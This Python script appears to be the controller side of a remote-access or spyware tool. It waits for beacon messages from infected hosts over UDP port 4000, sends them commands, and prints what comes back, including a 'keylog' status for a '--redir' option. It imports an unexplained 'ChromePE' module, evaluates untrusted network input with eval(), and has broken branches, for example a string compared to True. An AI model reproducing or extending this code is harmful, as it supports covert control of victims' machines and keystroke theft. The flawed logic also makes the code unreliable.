import socket
import ChromePE

def divider():
	print('==================================================')

def comm(req):
	host = "0.0.0.0"
	port = 4000
	
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.bind((host, port))
	
	res = False
	iters = 0
	
	# get addr from keep_alive msgs
	while res != True:
		msg, addr = s.recvfrom(100000)
		msg = msg.decode('utf-8')
		
		res = True
		
	# send req once to avoid infinite loop
	s.sendto(req.encode('utf-8'), addr)
			
	res2 = False
	# don't print keep-alive connection messages
	while res2 != True:
		msg, addr = s.recvfrom(100000)
		msg = msg.decode('utf-8')
	
		if msg != "trace_conn":
			# parse items in returned list
			if "--redir " not in req:
				msg = eval(msg)
				divider()
				
				for i in range(len(msg[0])):
					for item in range(len(msg)):
						print(msg[item][i])
					divider()
					print('')
			elif "--redir " in req:
				if req == True:
					divider()
					print("INTERACTRION: REDIR successful.")
					divider()
					print('')
				else:
					divider()
					print("REDIR: {keylog True} = "+str(msg))
					divider()
					print('')
			else:
				print(str(msg))
			res2 = True
		
	return 0
